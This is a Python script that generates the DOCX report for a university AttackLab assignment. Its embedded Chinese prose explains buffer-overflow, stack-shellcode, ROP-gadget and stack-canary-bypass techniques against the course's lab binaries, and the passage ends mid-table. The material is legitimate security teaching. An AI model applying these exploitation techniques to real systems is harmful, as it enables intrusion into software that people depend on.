#!/usr/bin/env python3
"""Build the Lab 3 report DOCX, preserving the report's visual design.

Runtime results and verbatim excerpts are loaded from analysis/logs and
analysis/gdb.  Static disassembly, payload structure and the explanatory prose
are separate design/analysis inputs; they are not represented as transcripts.
Optional evidence is rendered only when its section marker is present, never as
an empty block.  The local checks reproduce the core payload-generation, stdin
and stdout-matching steps, not every detail of GitHub Actions.
"""
import hashlib
import json
import os
import re
import subprocess
import sys

from docx import Document
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.enum.text import WD_ALIGN_PARAGRAPH, WD_BREAK
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Cm, Inches, Pt, RGBColor

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ANALYSIS = os.path.join(ROOT, "analysis")
GDB = os.path.join(ANALYSIS, "gdb")
LOGS = os.path.join(ANALYSIS, "logs")
DIS = os.path.join(ANALYSIS, "disassembly")
FIGS = os.path.join(ANALYSIS, "figs")

OUT = os.path.join(ROOT, "Lab3-AttackLab-实验报告.docx")

EAST = "微软雅黑"
ASCII = "微软雅黑"
MONO = "Consolas"
INK = RGBColor(0x21, 0x26, 0x30)
ACCENT = RGBColor(0x1F, 0x4E, 0x79)
CODE_BG = "F2F2F2"
HEAD_BG = "D6E4F7"
NOTE_BG = "FFF3CD"
NOTE_EDGE = RGBColor(0x8A, 0x6D, 0x1B)


# ---------------------------------------------------------------- helpers
def style_setup(doc):
    normal = doc.styles["Normal"]
    normal.font.name = ASCII
    normal.font.size = Pt(10.5)
    normal.font.color.rgb = INK
    normal.element.rPr.rFonts.set(qn("w:eastAsia"), EAST)
    normal.paragraph_format.space_after = Pt(3)
    normal.paragraph_format.line_spacing = 1.12

    for name, size, color, bold in (("Heading 1", 16, ACCENT, True),
                                    ("Heading 2", 13, ACCENT, True),
                                    ("Heading 3", 11.5, ACCENT, True)):
        st = doc.styles[name]
        st.font.name = ASCII
        st.font.size = Pt(size)
        st.font.bold = bold
        st.font.color.rgb = color
        rpr = st.element.get_or_add_rPr()
        rfonts = rpr.find(qn("w:rFonts"))
        if rfonts is None:
            rfonts = OxmlElement("w:rFonts")
            rpr.append(rfonts)
        rfonts.set(qn("w:ascii"), ASCII)
        rfonts.set(qn("w:hAnsi"), ASCII)
        rfonts.set(qn("w:eastAsia"), EAST)
        st.paragraph_format.keep_with_next = True
        st.paragraph_format.space_before = Pt(12 if name != "Heading 1" else 18)
        st.paragraph_format.space_after = Pt(6)

    sec = doc.sections[0]
    sec.page_width = Cm(21.0)
    sec.page_height = Cm(29.7)
    sec.top_margin = Cm(2.2)
    sec.bottom_margin = Cm(2.2)
    sec.left_margin = Cm(2.2)
    sec.right_margin = Cm(2.2)


_ANSI = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")
_CTRL = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")


def clean_text(s):
    return _CTRL.sub("", _ANSI.sub("", s))


def add_runs(par, text, size=None, bold=False, mono=False, color=None, italic=False):
    run = par.add_run(clean_text(text))
    run.font.name = MONO if mono else ASCII
    run.element.rPr.rFonts.set(qn("w:eastAsia"), EAST)
    if size:
        run.font.size = Pt(size)
    run.bold = bold
    run.italic = italic
    if color:
        run.font.color.rgb = color
    return run


def para(doc, text, size=None, bold=False, mono=False, color=None,
         align=None, space_after=None, italic=False):
    p = doc.add_paragraph()
    if align is not None:
        p.alignment = align
    add_runs(p, text, size=size, bold=bold, mono=mono, color=color, italic=italic)
    if space_after is not None:
        p.paragraph_format.space_after = Pt(space_after)
    return p


def bullet(doc, text, bold_prefix=None):
    p = doc.add_paragraph(style="List Bullet")
    if bold_prefix:
        add_runs(p, bold_prefix, bold=True)
    add_runs(p, text)
    return p


def shade_paragraph(p, hexcolor):
    pPr = p._p.get_or_add_pPr()
    shd = OxmlElement("w:shd")
    shd.set(qn("w:val"), "clear")
    shd.set(qn("w:color"), "auto")
    shd.set(qn("w:fill"), hexcolor)
    pPr.append(shd)


def set_par_border(p, **sides):
    """Add paragraph borders. Each kwarg is a side ('top'/'bottom'/'left'/'right')
    mapping to a dict of w: attributes, e.g. bottom={'val':'single','sz':6,
    'color':'1F4E79','space':4}. sz is in eighths of a point."""
    pPr = p._p.get_or_add_pPr()
    pBdr = pPr.find(qn("w:pBdr"))
    if pBdr is None:
        pBdr = OxmlElement("w:pBdr")
        pPr.append(pBdr)
    for side, spec in sides.items():
        el = OxmlElement(f"w:{side}")
        for k, v in spec.items():
            el.set(qn(f"w:{k}"), str(v))
        pBdr.append(el)


def set_table_borders(t, color="D3D9E3", sz=4):
    """Soften the table grid to light hairlines instead of default black."""
    tblPr = t._tbl.tblPr
    borders = OxmlElement("w:tblBorders")
    for side in ("top", "left", "bottom", "right", "insideH", "insideV"):
        el = OxmlElement(f"w:{side}")
        el.set(qn("w:val"), "single")
        el.set(qn("w:sz"), str(sz))
        el.set(qn("w:color"), color)
        borders.append(el)
    tblPr.append(borders)


def set_table_cell_margins(t, top=45, bottom=45, left=95, right=95):
    """Cell padding in dxa (1/20 pt): 95 dxa ≈ 4.75 pt horizontal breathing room."""
    tblPr = t._tbl.tblPr
    mar = OxmlElement("w:tblCellMar")
    for side, val in (("top", top), ("left", left), ("bottom", bottom), ("right", right)):
        el = OxmlElement(f"w:{side}")
        el.set(qn("w:w"), str(val))
        el.set(qn("w:type"), "dxa")
        mar.append(el)
    tblPr.append(mar)


def rule(doc, color="1F4E79", size=6, before=10, after=10):
    """A thin horizontal accent rule spanning the text column."""
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(before)
    p.paragraph_format.space_after = Pt(after)
    set_par_border(p, bottom={"val": "single", "sz": size, "color": color, "space": 1})
    return p


def code(doc, text, size=8.5):
    lines = text.rstrip("\n").split("\n")
    for i, line in enumerate(lines):
        p = doc.add_paragraph()
        p.paragraph_format.space_after = Pt(7 if i == len(lines) - 1 else 0)
        p.paragraph_format.space_before = Pt(4 if i == 0 else 0)
        p.paragraph_format.line_spacing = 1.0
        p.paragraph_format.left_indent = Cm(0.25)
        p.paragraph_format.right_indent = Cm(0.15)
        # Keep short blocks (hexdumps, snippets) on one page; a long listing is
        # better split than pushed wholesale onto a page of its own.
        if len(lines) <= 24:
            p.paragraph_format.keep_with_next = i < len(lines) - 1
        shade_paragraph(p, CODE_BG)
        set_par_border(p, left={"val": "single", "sz": 12, "color": "9AA5B1", "space": 6})
        add_runs(p, line if line else " ", size=size, mono=True)
    return


def think(doc, text):
    """First-person reasoning callout: the journal entries."""
    lines = text.rstrip("\n").split("\n")
    for i, line in enumerate(lines):
        p = doc.add_paragraph()
        p.paragraph_format.space_after = Pt(9 if i == len(lines) - 1 else 2)
        p.paragraph_format.space_before = Pt(4 if i == 0 else 0)
        p.paragraph_format.left_indent = Cm(0.35)
        p.paragraph_format.right_indent = Cm(0.2)
        shade_paragraph(p, NOTE_BG)
        set_par_border(p, left={"val": "single", "sz": 18, "color": "C9A227", "space": 6})
        if i == 0:
            add_runs(p, "推理手记　", size=9.5, bold=True, color=NOTE_EDGE)
        else:
            add_runs(p, "　　　　", size=9.5)
        add_runs(p, line, size=9.5, color=RGBColor(0x5A, 0x4A, 0x12))
    return


def caption(doc, text):
    return para(doc, text, size=9, color=RGBColor(0x55, 0x5A, 0x66),
                align=WD_ALIGN_PARAGRAPH.CENTER, space_after=8)


def picture(doc, path, width_in=6.4, cap=None):
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    p.add_run().add_picture(path, width=Inches(width_in))
    if cap:
        caption(doc, cap)


def set_cell_bg(cell, hexcolor):
    tcPr = cell._tc.get_or_add_tcPr()
    shd = OxmlElement("w:shd")
    shd.set(qn("w:val"), "clear")
    shd.set(qn("w:color"), "auto")
    shd.set(qn("w:fill"), hexcolor)
    tcPr.append(shd)


def table(doc, headers, rows, widths=None, font_size=9, mono_cols=()):
    t = doc.add_table(rows=1, cols=len(headers))
    t.style = "Table Grid"
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    set_table_borders(t)
    set_table_cell_margins(t)
    hdr = t.rows[0].cells
    for i, h in enumerate(headers):
        hdr[i].text = ""
        p = hdr[i].paragraphs[0]
        p.paragraph_format.space_after = Pt(2)
        p.paragraph_format.space_before = Pt(2)
        add_runs(p, h, size=font_size, bold=True)
        set_cell_bg(hdr[i], HEAD_BG)
    for ri, r in enumerate(rows):
        cells = t.add_row().cells
        for i, v in enumerate(r):
            cells[i].text = ""
            p = cells[i].paragraphs[0]
            p.paragraph_format.space_after = Pt(1)
            p.paragraph_format.space_before = Pt(1)
            add_runs(p, str(v), size=font_size, mono=(i in mono_cols))
            if ri % 2 == 1:
                set_cell_bg(cells[i], "F3F6FA")
    if widths:
        for i, w in enumerate(widths):
            for row in t.rows:
                row.cells[i].width = Cm(w)
    # Never let a row break across a page boundary: a split row leaves a
    # one-line fragment at the top of the next page.
    for row in t.rows:
        trPr = row._tr.get_or_add_trPr()
        cant_split = OxmlElement("w:cantSplit")
        trPr.insert(0, cant_split)
    return t


_pending_break = False


def page_break(doc):
    """Ask the next heading to start on a fresh page.

    An explicit <w:br type="page"/> paragraph at a page boundary renders an
    entirely blank page; `page_break_before` on the heading cannot.
    """
    global _pending_break
    _pending_break = True


def heading(doc, text, level=1):
    global _pending_break
    h = doc.add_heading(text, level=level)
    if _pending_break:
        h.paragraph_format.page_break_before = True
        _pending_break = False
    for run in h.runs:
        run.font.name = ASCII
        run.element.rPr.rFonts.set(qn("w:eastAsia"), EAST)
    if level == 1:
        set_par_border(h, bottom={"val": "single", "sz": 12, "color": "1F4E79", "space": 4})
    return h


def page_header(doc):
    hdr = doc.sections[0].header
    p = hdr.paragraphs[0]
    p.alignment = WD_ALIGN_PARAGRAPH.RIGHT
    set_par_border(p, bottom={"val": "single", "sz": 4, "color": "C9CED6", "space": 4})
    add_runs(p, "ICS 2026 Fall · Lab3 AttackLab", size=8.5, color=RGBColor(0x9A, 0xA2, 0xAE))


def page_number_footer(doc):
    sec = doc.sections[0]
    sec.different_first_page_header_footer = True
    footer = sec.footer
    p = footer.paragraphs[0]
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    set_par_border(p, top={"val": "single", "sz": 4, "color": "C9CED6", "space": 4})
    add_runs(p, "第 ", size=9, color=RGBColor(0x6B, 0x72, 0x80))
    run = p.add_run()
    f1 = OxmlElement("w:fldChar"); f1.set(qn("w:fldCharType"), "begin")
    it = OxmlElement("w:instrText"); it.set(qn("xml:space"), "preserve")
    it.text = "PAGE"
    f2 = OxmlElement("w:fldChar"); f2.set(qn("w:fldCharType"), "end")
    run._r.append(f1); run._r.append(it); run._r.append(f2)
    run.font.size = Pt(9)
    run.font.color.rgb = RGBColor(0x6B, 0x72, 0x80)
    add_runs(p, " 页", size=9, color=RGBColor(0x6B, 0x72, 0x80))


def section(path, start, end=None, drop_backtrace=False):
    lines = open(path, encoding="utf-8", errors="replace").read().splitlines()
    out, on = [], False
    for ln in lines:
        # Stop *before* the end marker: it belongs to the next excerpt, and
        # keeping it here printed every marker twice.
        if on and end and end in ln:
            break
        if start in ln:
            on = True
        if on:
            out.append(ln)
    if drop_backtrace:
        kept = []
        for ln in out:
            if re.match(r"^#\d+\s+0x[0-9a-f]+ in \?\? \(\)$", ln):
                break
            kept.append(ln)
        out = kept
    return "\n".join(out).rstrip()


def disasm_range(binary, lo, hi):
    path = os.path.join(DIS, f"{binary}.txt")
    out = []
    for ln in open(path, encoding="utf-8", errors="replace"):
        m = re.match(r"\s*([0-9a-f]+):", ln)
        if not m:
            if out:
                break
            continue
        addr = int(m.group(1), 16)
        if lo <= addr < hi:
            out.append(ln.rstrip("\n"))
    return "\n".join(out)


def disasm_func(binary, name, next_name):
    path = os.path.join(DIS, f"{binary}.txt")
    out, on = [], False
    for ln in open(path, encoding="utf-8", errors="replace"):
        if f"<{name}>:" in ln:
            on = True
        elif on and f"<{next_name}>:" in ln:
            break
        if on:
            out.append(ln.rstrip("\n"))
    return "\n".join(out)


def payload_hexdump(script):
    """Run only a generator to document its input bytes, not to claim success."""
    proc = subprocess.run([sys.executable, os.path.join(ROOT, script)],
                          cwd=ROOT, capture_output=True, timeout=15)
    if proc.returncode:
        raise RuntimeError(f"{script} failed ({proc.returncode}): "
                           f"{proc.stderr.decode('utf-8', 'replace')}")
    data = proc.stdout
    lines = [f"# {script}  ->  {len(data)} bytes (incl. trailing newline)"]
    for off in range(0, len(data), 16):
        chunk = data[off:off + 16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{off:04x}  {hexs:<47}  |{asc}|")
    return "\n".join(lines)


def optional_evidence(path, markers=()):
    """Return selected excerpts only when an evidence file/marker exists.

    New evidence may arrive after this report builder.  An absent file, or an
    unexpected log without an agreed marker, contributes no text: callers also
    skip its heading rather than publishing a blank evidence section.
    """
    if not os.path.isfile(path):
        return []
    excerpts = []
    for start, end in markers:
        excerpt = section(path, start, end).strip()
        if excerpt:
            excerpts.append(excerpt)
    return excerpts


def ci_transcript(ci_log, payload):
    """Extract one stored run, including its real stdout/stderr and status."""
    if not payload:
        return ""
    match = re.search(r"(?ms)^== " + re.escape(payload) +
                      r" -> .*?(?=^== |\Z)", ci_log)
    return match.group(0).rstrip() if match else ""


def required_excerpt(ev, key, source):
    """Refuse to silently publish a blank block for promised core evidence."""
    text = ev.get(key, "").strip()
    if not text:
        raise ValueError(f"missing required evidence {key!r} in {source}")
    return text


# ---------------------------------------------------------------- evidence
def load_evidence():
    ev = {}
    ev["env"] = json.load(open(os.path.join(LOGS, "environment.json"), encoding="utf-8"))
    ev["ci"] = json.load(open(os.path.join(LOGS, "ci_simulation.json"), encoding="utf-8"))
    ev["lengths"] = json.load(open(os.path.join(LOGS, "length_tests.json"), encoding="utf-8"))
    ev["hash_check"] = open(os.path.join(LOGS, "hash_check.txt"), encoding="utf-8").read()
    ev["ci_sim"] = open(os.path.join(LOGS, "ci_simulation.txt"), encoding="utf-8").read()
    ev["aslr"] = open(os.path.join(LOGS, "aslr.txt"), encoding="utf-8").read()

    g = os.path.join(GDB, "01_frame_and_main.txt")
    ev["frame_entry"] = section(g, "### stopped at input() entry", "### caller frame")
    ev["frame_prologue"] = section(g, "### single-step the prologue", "### break after gets()")
    ev["frame_after_gets"] = section(g, "### break after gets() and read the buffer back", "### backtrace")
    ev["main_bytes"] = section(g, "### main's machine code with raw bytes", None)

    g2 = os.path.join(GDB, "02_fixed_stack.txt")
    ev["wrap_entry"] = section(g2, "### at main(), called through __wrap_main", "### anonymous mapping")
    maps = section(g2, "Mapped address spaces:", "### break after gets")
    ev["fixed_maps"] = "\n".join(ln for ln in maps.splitlines() if "0x7210" in ln)
    ev["shellcode_inspect"] = section(g2, "### break after gets(); inspect the injected shellcode", "### watch grade_eval receive")
    ev["grade_hit"] = section(g2, "### watch grade_eval receive edi=4", "### continue to program exit")
    ev["shellcode_result"] = section(g2, "### continue to program exit", None)

    g3 = os.path.join(GDB, "03_nx.txt")
    ev["nx_frame"] = section(g3, "### input() frame on the ordinary thread stack", "Mapped address spaces:")
    ev["nx_maps"] = "\n".join(ln for ln in section(g3, "Mapped address spaces:", "### force the CPU").splitlines()
                               if "[stack]" in ln)
    ev["nx_fault"] = section(g3, "### force the CPU to fetch", None)

    g4 = os.path.join(GDB, "04_canary.txt")
    ev["canary_before"] = section(g4, "### step the prologue and the canary store", "### run to the point")
    ev["canary_after"] = section(g4, "### run to the point just after the 128-byte memcpy", "### continue into grade_eval(4)")
    ev["canary_hit"] = section(g4, "### continue into grade_eval(4)", "### run to the end")
    ev["canary_end"] = section(g4, "### run to the end", None)

    g4b = os.path.join(GDB, "04b_canary_smash.txt")
    ev["smash_before"] = section(g4b, "canary before input", "### continue: the canary check")
    ev["smash_after"] = section(g4b, "### continue: the canary check must abort the process", "### inferior state", drop_backtrace=True)

    g5 = os.path.join(GDB, "05_system_epilogue.txt")
    # Do not mix a superseded exploit transcript with the current implementation.
    # The old markers described 0x4242... and SIGBUS; the current payload keeps
    # main's fixed rbp and returns through __wrap_main.
    system_text = open(g5, encoding="utf-8", errors="replace").read()
    system_is_current = ("main's fixed frame pointer" in system_text
                         and "0x4242424242424242" not in system_text)
    if system_is_current:
        ev["sys_site"] = section(g5, "### returned into eval's system call site", "### after system() returns")
        ev["sys_after"] = section(g5, "### after system() returns: main's fixed frame pointer", "### eval's leave restores")
        ev["sys_epilogue"] = section(g5, "### eval's leave restores the wrapper return path", None)
    else:
        ev["sys_site"] = ev["sys_after"] = ev["sys_epilogue"] = ""

    # Additional official-question evidence (added by tools/capture_gdb.sh).
    ev["call_before"] = optional_evidence(os.path.join(GDB, "00_call_return.txt"), [
        ("### Q4: main immediately before call input", "### Q4: first instruction")])
    ev["call_entry"] = optional_evidence(os.path.join(GDB, "00_call_return.txt"), [
        ("### Q4: first instruction of input after call", "### Q2:")])
    ev["input_leave"] = optional_evidence(os.path.join(GDB, "00_call_return.txt"), [
        ("### Q5: step leave", "### Q5: step ret")])
    ev["input_return"] = optional_evidence(os.path.join(GDB, "00_call_return.txt"), [
        ("### Q5: step ret and return into caller", "### Q1:")])
    ev["length_dumps"] = optional_evidence(os.path.join(GDB, "06_length_overflow.txt"), [
        ("### n=20 after gets", "### n=32 after gets"),
        ("### n=32 after gets", None)])
    ev["main_memory"] = optional_evidence(os.path.join(GDB, "07_main_memory.txt"), [
        ("### x/9bx main", None)])

    ev["ci_records"] = {r["payload"]: r for r in ev["ci"]}
    ev["ci_blocks"] = {r["payload"]: ci_transcript(ev["ci_sim"], r["payload"])
                       for r in ev["ci"]}
    ev["ci_blocks"]["other"] = "\n\n".join(
        block for name, block in ev["ci_blocks"].items()
        if name != "payload.py" and block)
    command_log = os.path.join(LOGS, "command_substitution.txt")
    if os.path.isfile(command_log):
        ev["command_substitution"] = open(command_log, encoding="utf-8",
                                           errors="replace").read()

    return ev


# ---------------------------------------------------------------- report
def build(ev):
    ci_records = ev["ci_records"]
    ci_blocks = ev["ci_blocks"]
    ci_pass_count = sum(bool(r.get("pass")) for r in ev["ci"])
    ci_total = len(ev["ci"])
    doc = Document()
    doc.core_properties.title = "ICS-26Fall-FDU AttackLab 实验报告"
    doc.core_properties.author = "AttackLab"
    style_setup(doc)
    page_header(doc)
    page_number_footer(doc)

    # ---------- cover ----------
    for _ in range(4):
        doc.add_paragraph()
    para(doc, "复旦大学 · 计算机系统基础（ICS）· 2026 年秋季学期", size=11,
         align=WD_ALIGN_PARAGRAPH.CENTER, color=RGBColor(0x8A, 0x93, 0xA3))
    para(doc, "实验 3 · AttackLab", size=14, bold=True,
         align=WD_ALIGN_PARAGRAPH.CENTER, color=RGBColor(0x55, 0x5A, 0x66))
    for _ in range(2):
        doc.add_paragraph()
    para(doc, "AttackLab 实验报告", size=34, bold=True,
         align=WD_ALIGN_PARAGRAPH.CENTER, color=ACCENT)
    rule(doc, color="1F4E79", size=12, before=16, after=12)
    para(doc, "缓冲区溢出 · 栈空间执行 · ROP · Stack Canary", size=13,
         align=WD_ALIGN_PARAGRAPH.CENTER, color=RGBColor(0x55, 0x5A, 0x66))
    para(doc, "—— 包含设计推导、调试记录与复盘的技术报告 ——", size=11.5,
         align=WD_ALIGN_PARAGRAPH.CENTER, color=RGBColor(0x7A, 0x80, 0x8A))
    for _ in range(3):
        doc.add_paragraph()
    para(doc, "姓名：____________________　　学号：____________________",
         size=12, align=WD_ALIGN_PARAGRAPH.CENTER)
    doc.add_paragraph()
    para(doc, "日期：2026 年 11 月 25 日", size=11,
         align=WD_ALIGN_PARAGRAPH.CENTER, color=RGBColor(0x55, 0x5A, 0x66))
    for _ in range(2):
        doc.add_paragraph()
    para(doc, "提交内容：attacklab.py、payload.py、payload_dark.py、payload_rop.py、payload_canary.py 与本 PDF；"
              "仓库另含 attack/（原始靶机）、src/（参考源码）、tools/（复现与检查脚本）及 analysis/（GDB 实录、"
              "长度矩阵、反汇编与终端截图等证据）",
         size=10.5, align=WD_ALIGN_PARAGRAPH.CENTER, color=RGBColor(0x7A, 0x80, 0x8A))
    para(doc, f"四个 payload 在 VirtualBox Ubuntu 24.04 的本地核心判分复现中 {ci_pass_count}/{ci_total} 命中预期 stdout；"
              "GDB 实录、长度矩阵、哈希校验随仓库提交，报告生成器按小节读取这些记录。",
         size=10.5, align=WD_ALIGN_PARAGRAPH.CENTER, color=RGBColor(0x7A, 0x80, 0x8A))
    page_break(doc)

    # ---------- TOC ----------
    heading(doc, "目录", 1)
    toc = [
        "一、实验总览：四个靶机，四把钥匙",
        "二、实验环境：系统、哈希与工具链",
        "三、静态分析：三个 ELF 的底细",
        "四、任务一：观察 input 的栈帧（20 分）",
        "五、任务二：长度矩阵与崩溃边界（5 分）",
        "六、任务三：溢出执行 ./malware（25 测试 + 5 报告）",
        "七、任务四：main 的机器码与内存布局（5 分）",
        "八、任务五：48 字节牢笼里的 shellcode（25 测试 + 5 报告）",
        "九、任务六：NX 之下的 ROP 攻击（10 测试 + 10 报告）",
        "十、任务七：绕过 Stack Canary（10 测试 + 10 报告）",
        "十一、验收：虚拟机记录与已完成的公开 CI",
        "十二、防守视角：从攻击到防御",
        "十三、复盘：踩过的坑与捡到的顿悟",
        "附录 A：四个 payload 的完整清单与十六进制转储",
        "附录 B：关键 GDB 实录摘录",
        "附录 C：环境参数与文件哈希",
        "附录 D：常用命令速查",
    ]
    for t in toc:
        para(doc, t, size=11, space_after=4)
    page_break(doc)

    # ---------- 1 总览 ----------
    heading(doc, "一、实验总览：四个靶机，四把钥匙", 1)
    para(doc, "本报告依据静态分析、GDB 观察和运行记录组织实验过程。先概述各任务的结果与关键机制，"
              "再区分设计推导、事后复现和原始实录，说明 payload 的构造依据与实现限制。")
    table(doc,
          ["任务", "分值", "钥匙（一句话原理）", "状态"],
          [
              ["① 观察 input 栈帧", "20（报告）", "断点之下，帧无秘密", "完成，第四节"],
              ["② 不同长度输入测试", "5（报告）", "用 '1' 串丈量出生死线：23/24 与 47/48", "完成，第五节"],
              ["③ 溢出执行 ./malware", "25+5", "链子塞不进 48 字节牢笼，就复用 eval 里现成的那行 system 调用",
               f"stdout 命中：{ci_records['payload.py']['pass']}，第六节"],
              ["④ GDB 检查 main 机器码", "5（报告）", "55 48 89 e5…… e8 的 rel32 手算一遍", "完成，第七节"],
              ["⑤ 栈空间执行", "25+5", "dark-calc 的栈是 mmap 出来的 rwxp 固定地址——ASLR 与 NX 双杀失败",
               f"stdout 命中：{ci_records['payload_dark.py']['pass']}，第八节"],
              ["⑥ ROP", "10+10", "CPU 只认字节流：41 5f c3 往前挪一个字节，pop r15 就变成 pop rdi",
               f"stdout 命中：{ci_records['payload_rop.py']['pass']}，第九节"],
              ["⑦ Canary", "10+10", "金丝雀没瞎——只是 memcpy 的落点被我改了，绕过了它看不见的地方",
               f"stdout 命中：{ci_records['payload_canary.py']['pass']}，第十节"],
          ],
          widths=[3.4, 1.9, 9.3, 2.4])
    para(doc, "四个 payload 的运行记录来自 VirtualBox Ubuntu 24.04 的本地核心判分复现（"
              "analysis/logs/ci_simulation.json/.txt）。下表由结构化记录生成；bool 仅表示"
              "目标 stdout 是否包含预期串，不表示进程正常退出。")
    table(doc, ["payload", "目标", "目标退出状态", "stdout 预期串命中"],
          [[r["payload"], r["target"], str(r["target_rc"]), str(bool(r["pass"]))]
           for r in ev["ci"]], widths=[4.2, 4.0, 3.8, 5.0], mono_cols=(0, 1))
    para(doc, "阅读指南：黄底「推理手记」用于设计推导或明确标注的事后复现；"
              "带文件名或小节标记的灰底块摘自 GDB/objdump/终端记录，栈图与带注释的指令清单是分析示意。"
              "图 1–5 是虚拟机文本控制台的终端截图，可用 tools/screens/ 重放场景；"
              "截图与附录 B 来自不同次运行，ASLR 地址、canary 值与 PID 可变。"
              "报告中的运行结果引用现有证据，构建脚本本身不运行 exploit 验收，也不取代 CI。")
    page_break(doc)

    # ---------- 2 环境 ----------
    heading(doc, "二、实验环境：系统、哈希与工具链", 1)
    heading(doc, "2.1 环境", 2)
    env = ev["env"]
    table(doc,
          ["项目", "取值"],
          [
              ["操作系统", "VirtualBox Ubuntu 24.04.5 LTS（内核 " + env["uname"] + "）"],
              ["gcc / gdb / binutils", env["gcc"] + " ｜ " + env["gdb"] + " ｜ " + env["objdump"]],
              ["glibc (ldd)", env["libc"]],
              ["Python", env["python"]],
              ["ASLR（randomize_va_space）", env["aslr"] + "（全量随机化开启）"],
              ["GDB 默认 disable-randomization", env["gdb_default_disable_randomization"] + "——实验会话全部显式 off，不然看到的栈地址是假象"],
              ["CI 环境", "GitHub Actions ubuntu-24.04；runner 版本与 payload 测试超时见 workflow"],
          ],
          widths=[5.0, 12.0])
    para(doc, "四个 payload 只依赖非 PIE 主映像的固定代码地址和 dark-calc 的固定映射，"
              "对栈地址、libc 地址、glibc 小版本零依赖。本实验在 VirtualBox Ubuntu 24.04"
              "（glibc 2.39，与 CI 的 ubuntu-24.04 环境一致）中完成。")
    heading(doc, "2.2 完整性：attack/ 一个字节都没动", 2)
    code(doc, ev["hash_check"].split("# payload scripts")[0].rstrip())
    heading(doc, "2.3 打法", 2)
    bullet(doc, "静态勘察：readelf/nm/objdump 把段、符号、指令字节全摊开；tools/gadgets.py 按字节串扫 gadget（0x5f 0xc3 之类）；", "① ")
    bullet(doc, "动态观察：GDB 批量会话（tools/gdb/*.gdb）断点看帧、看页权限、看寄存器，全程关掉 gdb 的地址固定化；", "② ")
    bullet(doc, "端到端：tools/run_evidence.py 在虚拟机中记录「生成 payload → 重定向 stdin → 匹配 stdout」的核心判分步骤；", "③ ")
    bullet(doc, "复盘：tools/build_report.py 读取已有日志的小节、结构化运行结果、静态反汇编及手工分析文字；"
                "payload hexdump 只记录生成器输出，不是目标运行证据。", "④ ")
    page_break(doc)

    # ---------- 3 静态勘察 ----------
    heading(doc, "三、静态分析：三个 ELF 的底细", 1)
    heading(doc, "3.1 三兄弟的户口本", 2)
    table(doc,
          ["属性", "dark-calc", "dark-calc-nx", "dark-log"],
          [
              ["文件类型", "ELF64 x86-64，动态链接，非 PIE（ET_EXEC）", "同左", "同左"],
              ["入口 _start", "0x401890", "0x401700", "0x401590"],
              ["GNU_STACK", "RW（未请求执行）", "RW", "RW"],
              ["RELRO", "Partial（.got.plt 可写）", "Partial", "Partial"],
              ["栈保护（canary）", "无", "无", "__stack_chk_fail（input/main/grade_eval 三处校验）"],
              ["特殊构造器", "init_fixed_stack（固定地址 RWX 栈）+ __wrap_main 栈切换", "无（常规 main 调用）", "无"],
          ],
          widths=[3.2, 5.2, 3.2, 5.4])
    para(doc, "三个主映像都链接在 0x400000、非 PIE：.text/.rodata 的地址跨进程恒定——这是后面"
              "所有 ret2code/ROP 都用绝对地址的前提。注意 GNU_STACK 那行全是 RW：ELF 头只会"
              "「请求」普通线程栈的权限，真正决定生死的是运行期页表，dark-calc 的底牌在第八节才翻开。")
    heading(doc, "3.2 dark-calc：gets 的漫灌与 15 字符的闸门", 2)
    code(doc, disasm_func("dark-calc", "input", "eval"))
    code(doc, disasm_func("dark-calc", "eval", "grade_eval"))
    para(doc, "要点：expression 只有 16 字节却喂给无界的 gets()；input() 里没有 canary；eval 的 "
              "MAXLEN=15 截断发生在 gets 之后——它只能决定 shell 命令里表达式的长短，"
              "拦不住已经发生的栈溢出。grade_eval(4) 打印「Hope A will be your grade!」，"
              "是任务五至七的目标函数；任务三的目标则是 system(\"./malware\")。")
    heading(doc, "3.3 那个名叫「栈」的 mmap", 2)
    code(doc, disasm_func("dark-calc", "init_fixed_stack", "__wrap_main"))
    code(doc, disasm_func("dark-calc", "__wrap_main", "__libc_csu_init"))
    para(doc, "init_fixed_stack 用 mmap(0x721000000000, 0x802000, RWX, "
              "MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0) 在固定地址申请 8 MiB，"
              "再把两端各 0x1000 用 mprotect 砸成 PROT_NONE 守卫页，栈顶 0x721000801000 存进 "
              "fixed_stack_top；__wrap_main 在调 main 前把 rsp 切过去。翻译成人话：dark-calc 的"
              "「栈」不是内核分配的那块 rw-p，而是一段固定地址、可读可写可执行的匿名映射。")
    heading(doc, "3.4 dark-log：结构体里的第二把刀", 2)
    table(doc,
          ["偏移（相对 rbp）", "字段", "说明"],
          [
              ["-0x120", "expression[128]", "gets 写入点，也是 memcpy 的源"],
              ["-0xa0", "logMsg[128]", "memcpy 的目的基址（logMsg + len）"],
              ["-0x20", "len（int）", "初值 0；偏移 256 处可被输入覆盖——这是第七节的关键"],
              ["-0x1c", "pad[8]", "gets 的 NUL 终止符可以安全落在这里"],
              ["-0x08", "stack canary", "fs:0x28 的副本，返回前异或校验"],
              ["+0x00 / +0x08", "saved rbp / 返回地址", "控制流目标"],
          ],
          widths=[3.4, 4.6, 9.0])
    code(doc, disasm_range("dark-log", 0x4016E1, 0x401701) + "\n" +
         disasm_range("dark-log", 0x401719, 0x40173D) + "\n" +
         disasm_range("dark-log", 0x4017DF, 0x4017F5))
    para(doc, "编译器把 memcpy 内联成 16 个 qword 拷贝，目的地 = logMsg + len，而 len 完全由输入"
              "控制。也就是说 dark-log 里其实有两把刀：一把是 gets 漫灌，另一把是「目的地可被"
              "篡改的定长拷贝」。")
    heading(doc, "3.5 malware：一个认亲的脚本", 2)
    code(doc, open(os.path.join(ROOT, "attack", "malware"), encoding="utf-8").read())
    para(doc, "malware 打印进程树，然后沿父进程链逐级向上找进程名 dark-calc：只有 dark-calc "
              "亲自（经由 system() 等）启动的 shell 再启动它，才会喊出成功横幅。")
    heading(doc, "3.6 保护机制：纸面上的 vs 运行期的", 2)
    table(doc,
          ["机制", "静态证据", "运行期真相"],
          [
